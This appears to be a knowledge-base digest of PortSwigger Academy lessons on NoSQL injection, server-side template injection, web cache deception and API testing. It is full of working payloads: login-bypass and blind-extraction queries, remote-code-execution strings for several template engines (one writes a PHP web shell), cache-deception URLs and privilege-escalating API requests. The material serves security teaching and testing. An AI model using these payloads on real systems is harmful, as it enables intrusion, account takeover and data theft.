# PortSwigger Academy — Injection Part 2: NoSQL, SSTI, Web Cache Deception, API Testing
> Source: https://portswigger.net/web-security | RAG Knowledge Base | Full detail preserved

---

## NoSQL Injection
**Source:** https://portswigger.net/web-security/nosql-injection

### What It Is

NoSQL injection is a vulnerability where an attacker is able to interfere with the queries that an application makes to a NoSQL database. It can enable attackers to bypass authentication or protection mechanisms, extract or edit data, cause a denial of service, or execute code on the server.

Two primary attack types:
- **Syntax Injection**: Breaking out of the query's data structures and injecting custom payloads, similar to SQL injection but adapted for the varied query languages of NoSQL systems.
- **Operator Injection**: Manipulating NoSQL query operators to subvert query logic.

### How to Find It

**Syntax injection detection — MongoDB:**

Inject a fuzz string containing characters that can break query syntax:
```
'"`{ ;$Foo} $Foo \xYZ
```

URL-encoded variant:
```
'%22%60%7b%0d%0a%3c%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

JSON body variant:
```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

Submit individual characters one at a time to identify which are interpreted as syntax. Then confirm with Boolean conditions:
- False condition: `fizzy' && 0 && 'x`
- True condition: `fizzy' && 1 && 'x`

Different responses confirm injection is taking place.

**Operator injection detection:**

For JSON body parameters:
```json
{"username":{"$ne":"invalid"},"password":"peter"}
```

For URL parameters, convert to bracket notation:
```
username[$ne]=invalid&password[$ne]=invalid
```

If URL parameter format doesn't work, change request method to POST, set `Content-Type: application/json`, and inject operators as nested JSON objects. The **Content Type Converter** Burp extension automates this conversion.

### All Attack Techniques with Full Payloads

#### Authentication Bypass — Operator Injection

Match any non-invalid username and any non-empty password:
```json
{"username":{"$ne":"invalid"},"password":{"$ne":""}}
```

Target specific known accounts using `$in`:
```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

URL parameter format:
```
username[$ne]=invalid&password[$ne]=invalid
```

#### Always-True Condition Override — Syntax Injection

```
category=fizzy'||'1'=='1
```
Produces server-side query: `this.category == 'fizzy'||'1'=='1'`

#### Null Character Truncation

```
category=fizzy'%00
```
MongoDB ignores characters after a null byte — removes subsequent query conditions.

#### Data Extraction — Character-by-Character (JavaScript `$where`)

```
admin' && this.password[0] == 'a' || 'a'=='b
admin' && this.password[0] == 'b' || 'a'=='b
```

Use regex `.match()` for pattern testing:
```
admin' && this.password.match(/\d/) || 'a'=='b
```

Regex-based data exfiltration via operator injection:
```json
{"username":"admin","password":{"$regex":"^a.*"}}
{"username":"admin","password":{"$regex":"^ab.*"}}
```

#### Field Name Extraction via `Object.keys()`

```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```
Increment the `{0}` index to extract each field name character by character.

Test field existence:
```
admin' && this.password!='
admin' && this.username!='
admin' && this.foo!='
```

#### Timing-Based (Blind) Attacks

Conditional sleep:
```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

Alternative conditional sleep:
```
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

Unconditional delay via `$where`:
```json
{"$where": "sleep(5000)"}
```

### MongoDB Operators Used in Attacks

| Operator | Purpose |
|---|---|
| `$ne` | Not equal — match all non-specific values |
| `$in` | Match against an array of values |
| `$nin` | Not in array |
| `$gt` | Greater than |
| `$where` | Evaluate arbitrary JavaScript |
| `$regex` | Pattern matching |
| `$exists` | Check field existence |
| `$type` | Match by BSON type |

### Bypass Methods

- URL parameter to JSON conversion: switch to POST with `application/json` body
- Content Type Converter extension: automates GET-to-POST and URL-to-JSON conversion
- Null character truncation: `%00` after payload drops subsequent query conditions
- URL-encode the fuzz string to bypass WAF pattern matching

### Tools
- Burp Suite (Repeater, Intruder)
- Content Type Converter BApp

### Impact
- Authentication bypass
- Unauthorized data extraction (full document contents, field values)
- Data modification or deletion
- Denial of service
- Remote code execution (via `$where` with JavaScript on MongoDB)

---

## Server-Side Template Injection (SSTI)
**Source:** https://portswigger.net/web-security/server-side-template-injection

### What It Is

Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. SSTI arises when user input is concatenated directly into a template instead of being passed in as data. This allows attackers to inject arbitrary template directives that are executed by the server.

### How to Find It

**Step 1 — Fuzzing:**

Inject a polyglot fuzzing string containing characters used in template expressions across multiple engines:
```
${{<%[%'"}}%\
```
If an exception is raised, this indicates the server is processing the input as a template expression.

**Step 2 — Plaintext Context:**

Submit mathematical expressions as parameter values:
```
http://vulnerable-website.com/?username=${7*7}
```
If the response includes `49` rather than the literal string `${7*7}`, injection is confirmed.

**Step 3 — Code Context:**

When user input appears inside an existing template expression, try to break out:
```
http://vulnerable-website.com/?greeting=data.username}}<tag>
```
If `<tag>` is rendered as HTML, the application is vulnerable.

### Template Engine Identification Decision Tree

```
Test ${7*7}
├── Output 49 → likely Twig or Jinja2 → test {{7*'7'}}
│   ├── Output 49 → Twig (PHP)
│   └── Output 7777777 → Jinja2 (Python)
Test <%= 7*7 %>
├── Output 49 → ERB (Ruby)
Test #{7*7}
├── Evaluated → Ruby string interpolation
Test ${7*7} (Java engines)
├── Error with Java stack trace → FreeMarker or Velocity
```

### All Attack Techniques with Full Payloads

#### Detection Payloads (Multi-Engine)
```
{{7*7}}           # Jinja2, Twig
${7*7}            # FreeMarker, Velocity
<%= 7*7 %>        # ERB
#{7*7}            # Ruby string interpolation
${{7*7}}          # Pebble
```

#### Mako (Python) — RCE
```
<% import os
x=os.popen('id').read()
%>
${x}
```

#### ERB (Ruby) — Directory Listing and File Read
```
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
```

#### Java Template Engines — Environment Variables
```
${T(java.lang.System).getenv()}
```

#### Velocity (Java) — RCE via ClassTool
```
$class.inspect("java.lang.Runtime").type.getRuntime().exec("bad-stuff-here")
```

#### Twig (PHP) — RCE
```
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```
Using `system()`:
```
{{['id']|filter('system')}}
```

#### Jinja2 (Python) — RCE via Class Hierarchy Traversal
```
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[<index>]('id',shell=True,stdout=-1).communicate()}}
```

#### Freemarker (Java) — RCE via `new()` and `Execute`
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}
```

Or via `ClassInfo`:
```
${product.getClass().forName("freemarker.template.utility.Execute").newInstance()("id")}
```

#### Smarty (PHP) — RCE
```
{php}echo `id`;{/php}
```

Smarty 3+ (where `{php}` is disabled):
```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

#### Handlebars (Node.js) — RCE
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Exploitation Methodology

Three-phase approach:
1. **Read** — Study documentation for the identified template engine: basic syntax, built-in objects, security considerations, known exploits.
2. **Explore** — Map the environment. Enumerate accessible objects, global variables, and developer-supplied template objects.
3. **Attack** — Chain accessible objects and methods to achieve the goal (RCE, file read, data exfiltration).

### Sandbox Escapes

Common bypass approaches:
- Walk Python's class hierarchy (`__class__`, `__mro__`, `__subclasses__`) to find classes not in sandbox blocklist
- Use engine-specific execution utilities (Freemarker's `Execute`, Velocity's `ClassTool`)
- Exploit developer-supplied objects that have access to restricted functionality
- Find secondary reflection points or filters that evaluate expressions

### Impact
- Remote code execution (complete server compromise)
- Arbitrary file read
- Data exfiltration
- Server-side request forgery
- Denial of service
- Privilege escalation within the application

---

## Web Cache Deception
**Source:** https://portswigger.net/web-security/web-cache-deception

### What It Is

Web cache deception is a vulnerability where an attacker persuades a victim to visit a malicious URL, inducing the victim's browser to make an ambiguous request for sensitive content. The cache misinterprets the response as static/cacheable and stores it. The attacker then retrieves that cached response from the same URL.

**Key distinction from cache poisoning:** Cache deception exploits cache rules to store and then access sensitive victim data. Cache poisoning injects malicious content that is served to other users.

The attack relies on parsing discrepancies between the cache server and the origin server — they interpret the same URL differently, causing the cache to store content it should not.

### How to Find It

**Step 1 — Identify caching behavior:**
- Send request to a dynamic endpoint. Look for `X-Cache: miss`, then repeat and look for `X-Cache: hit`.
- Check for `Cache-Control: public; max-age=<value>` headers.
- Note significant response time differences between first and second requests.

**Step 2 — Probe for parsing discrepancies:**
- Modify a dynamic endpoint by appending arbitrary strings: `/api/orders/123/foo`
- Then append static-looking extensions: `/api/orders/123/foo.js`
- If the second URL returns the dynamic response AND is cached, a discrepancy exists.

**Step 3 — Test delimiters without poisoning the cache:**
- Use POST requests (typically not cached) or add a cache-buster query parameter when probing.

### All Attack Techniques with Full Payloads

#### 1. Path Mapping Discrepancies

Origin uses REST-style routing; cache uses file mapping:
```
/user/123/profile/wcd.css
```
- Origin sees: `/user/123/profile` endpoint → returns dynamic profile data
- Cache sees: a `.css` file → caches the response

Test progression:
```
/api/orders/123
/api/orders/123/foo
/api/orders/123/foo.js
```

#### 2. Delimiter-Based Attacks

**Semicolon — Java Spring matrix variables:**
```
/profile;foo.css
```
- Origin (Spring): `;` is a matrix variable delimiter → processes `/profile`
- Cache: no knowledge of `;` syntax → sees full path with `.css` → caches

**Period — Ruby on Rails format specifier:**
```
/profile.ico
```

**Question mark — query string confusion:**
```
/myaccount?wcd.css
```

**Encoded null byte — OpenLiteSpeed:**
```
/profile%00foo.js
```

**Encoded hash:**
```
/profile%23wcd.css
```

**Encoded question mark:**
```
/myaccount%3fwcd.css
```

#### 3. Static Directory Traversal

**When origin resolves dot-segments but cache does not:**
```
/static/..%2fprofile
/assets/..%2fprofile
```

**When cache resolves dot-segments but origin does not:**
```
/profile%2f%2e%2e%2fstatic
```

**Combined with delimiter:**
```
/profile;%2f%2e%2e%2fstatic
```

#### 4. File Name Cache Rules

```
/profile%2f%2e%2e%2findex.html
/profile%2f%2e%2e%2frobots.txt
/profile%2f%2e%2e%2ffavicon.ico
```

#### 5. Delimiter Enumeration Methodology

Add an arbitrary string between the path and test character:
```
/settings/users/listaaa       ← baseline
/settings/users/list;aaa      ← if matches base response, ; is a delimiter
```

Test all ASCII printable characters plus encoded non-printables: `%00`, `%0A`, `%09`.

### Detecting Cached Responses

| Header | Meaning |
|---|---|
| `X-Cache: hit` | Served from cache |
| `X-Cache: miss` | Fetched from origin (cached on this request) |
| `X-Cache: dynamic` | Not cacheable |
| `Cache-Control: public; max-age=X` | Configured as cacheable |

### Tools
- **Burp Suite Param Miner**: Settings → "Add dynamic cachebuster" → view in Logger tab
- **Burp Intruder**: Disable "Payload encoding" when testing delimiter characters
- **Burp Scanner**: Automatically detects path mapping discrepancy vulnerabilities
- **Web Cache Deception Scanner BApp**: Available in BApp Store

### Impact
- Access to other users' sensitive account data
- Session token theft
- Full account takeover
- PII disclosure
- Financial data exposure

---

## API Testing
**Source:** https://portswigger.net/web-security/api-testing

### What It Is

APIs enable software systems to communicate and share data. API vulnerabilities are often harder to detect than web application vulnerabilities because APIs may not have a visible UI and documentation may be incomplete or internal-only.

### API Reconnaissance

**Documentation Discovery Paths:**
```
/api
/swagger/index.html
/swagger/v1
/openapi.json
/api/swagger/v1
/api/swagger
/api-docs
/api/docs
/api/openapi.json
```

When you find `/api/swagger/v1/users/123`, also investigate:
```
/api/swagger/v1
/api/swagger
/api
```

### All Attack Techniques

#### HTTP Method Testing

Test all HTTP verbs against each discovered endpoint:
```
GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
```

Use Burp Intruder with built-in HTTP verbs wordlist. Example:
```
GET /api/tasks          → allowed
DELETE /api/tasks/1     → may be unprotected
PUT /api/user/update    → may not enforce auth
```

#### Content-Type Manipulation

```
Content-Type: application/json
Content-Type: application/xml
Content-Type: text/plain
Content-Type: application/x-www-form-urlencoded
```

Switching Content-Type may:
- Trigger errors revealing useful information
- Bypass input validation or WAF rules
- Expose differences in processing logic

Use the **Content Type Converter BApp** to automatically convert between XML and JSON.

#### Hidden Endpoint Discovery

Replace path segments with common alternative terms:
```
/api/user/update → /api/user/delete
/api/user/update → /api/user/add
/api/user/update → /api/user/remove
/api/user/update → /api/user/admin
```

Use Param Miner to automatically test up to 65,536 parameter names per request.

#### Mass Assignment Vulnerabilities

Step 1 — Discover hidden parameters by examining API responses:
```http
PATCH /api/users/
Content-Type: application/json

{"username": "wiener", "email": "wiener@example.com"}
```

Response reveals hidden field `isAdmin: false`.

Step 2 — Test with invalid value:
```json
{"username": "wiener", "email": "wiener@example.com", "isAdmin": "foo"}
```

Step 3 — Exploit with valid value:
```json
{"username": "wiener", "email": "wiener@example.com", "isAdmin": true}
```

#### Server-Side Parameter Pollution (SSPP)

**Technique 1 — Truncating with encoded hash:**
```
GET /userSearch?name=peter%23foo&back=/home HTTP/1.1
```
Server-side becomes: `GET /users/search?name=peter#foo&publicProfile=true`
The `#` truncates `&publicProfile=true`.

**Technique 2 — Injecting invalid parameters:**
```
GET /userSearch?name=peter%26foo=xyz&back=/home HTTP/1.1
```
Server-side becomes: `GET /users/search?name=peter&foo=xyz&publicProfile=true`

**Technique 3 — Injecting valid known parameters:**
```
GET /userSearch?name=peter%26email=foo&back=/home HTTP/1.1
```

**Technique 4 — Overriding existing parameters:**
```
GET /userSearch?name=peter%26name=carlos&back=/home HTTP/1.1
```

Technology-specific duplicate parameter parsing:
| Technology | Behavior |
|---|---|
| PHP | Parses the **last** parameter only → `carlos` |
| ASP.NET | **Combines** both values → `peter,carlos` |
| Node.js/Express | Parses the **first** parameter only → `peter` |

**Technique 5 — REST path injection:**
```
GET /edit_profile.php?name=peter%2f..%2fadmin HTTP/1.1
```
Server-side becomes: `GET /api/private/users/peter/../admin` → after normalization: `/api/private/users/admin`

**Technique 6 — Structured data injection (form to JSON):**
```
name=peter","access_level":"administrator
```
Server-side becomes: `PATCH /users/7312/update {"name":"peter","access_level":"administrator"}`

### Tools
- **Burp Scanner** — Crawling, OpenAPI parsing, automatic vulnerability detection
- **Burp Repeater** — Manual endpoint testing
- **Burp Intruder** — HTTP verb fuzzing, parameter name fuzzing
- **Param Miner BApp** — Up to 65,536 parameter names per request
- **OpenAPI Parser BApp** — Parse and test OpenAPI specs
- **JS Link Finder BApp** — Extract endpoints from JavaScript files
- **Content Type Converter BApp** — Convert between XML/JSON
- **Postman** — API exploration and testing

### Impact
- Unauthorized access to other users' data (BOLA/IDOR)
- Privilege escalation (mass assignment → admin)
- Internal network access (SSPP → internal API access)
- Authentication bypass
- Data exfiltration
- Business logic bypass
